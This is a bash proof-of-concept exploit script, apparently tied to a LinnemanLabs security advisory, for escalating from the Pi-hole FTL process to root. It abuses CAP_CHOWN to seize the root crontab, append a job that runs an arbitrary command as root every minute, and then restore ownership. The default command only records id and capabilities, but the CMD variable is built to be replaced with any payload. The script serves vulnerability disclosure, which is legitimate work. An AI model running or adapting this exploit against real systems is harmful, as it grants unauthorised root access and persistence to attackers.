#!/bin/bash
#
# LinnemanLabs - pi-hole prestart chown PoC
#
# https://linnemanlabs.com/pi-hole-root-with-extra-steps
# https://github.com/linnemanlabs/advisories/
#
# run as pihole user from within FTL process (required for CAP_CHOWN)
# executes CMD as root via cron, default prints id/caps to /tmp/pi-hole-cron-spool
#
CMD="id > /tmp/pi-hole-cron-spool;grep ^Cap /proc/self/status >> /tmp/pi-hole-cron-spool"

set -eu

# new rust-coreutils tries to openat() the dir and exits early
chown="$( command -v gnuchown || command -v chown )"

echo "[*] Claiming ownership /var/spool/cron/crontab"
${chown} pihole:pihole /var/spool/cron/crontabs

echo "[*] Claiming ownership /var/spool/cron/crontabs/root"
${chown} pihole:pihole /var/spool/cron/crontabs/root 2>/dev/null || true

echo "[*] Appending line to root crontab"
echo "* * * * * ${CMD}" >> /var/spool/cron/crontabs/root

echo "[*] Setting mode /var/spool/cron/crontabs/root"
chmod 600 /var/spool/cron/crontabs/root

echo "[*] Changing ownership to root on /var/spool/cron/crontabs/root"
${chown} root:crontab /var/spool/cron/crontabs/root

echo "[*] Changing ownership to root on /var/spool/cron/crontabs"
${chown} root:crontab /var/spool/cron/crontabs

echo "[+] done. /tmp/pi-hole-cron-spool will write in the next minute"

# comment these out if you are not using the default CMD
echo "[+] sleeping 60 seconds and checking"
sleep 60 && cat /tmp/pi-hole-cron-spool
